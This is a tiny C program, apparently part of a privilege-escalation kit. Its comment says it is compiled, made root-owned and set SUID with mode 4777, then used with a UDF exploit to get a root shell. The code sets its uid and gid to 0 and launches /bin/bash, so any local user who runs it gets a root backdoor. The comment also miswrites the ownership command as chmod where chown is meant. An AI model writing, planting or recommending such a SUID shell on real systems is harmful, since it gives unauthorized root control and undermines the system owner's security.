/*
 * Compile and use in conjunction with UDF to create shell as root. 
 * Must set owner to root (chmod root:root bomel) and set appropriate permissions chmod 4777 ( Sets SUID and allows everyone to run)
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)  
{
        setuid(0); setgid(0); system("/bin/bash");
}
